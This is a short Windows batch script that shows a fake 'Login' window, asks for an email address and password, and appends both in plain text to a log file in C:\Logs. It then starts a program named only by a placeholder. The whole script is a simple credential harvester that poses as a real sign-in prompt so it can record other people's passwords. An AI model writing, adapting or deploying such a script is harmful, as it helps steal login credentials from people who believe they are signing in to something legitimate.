@echo off

color 7

title Login

cls

echo Please Enter Email Adress And Password

echo.

echo.

cd “C:\Logs”

set /p username=Username:
set /p password=Password:

echo Username=”%username%” Password=”%password%” >> Log.txt

start >>Program Here<<


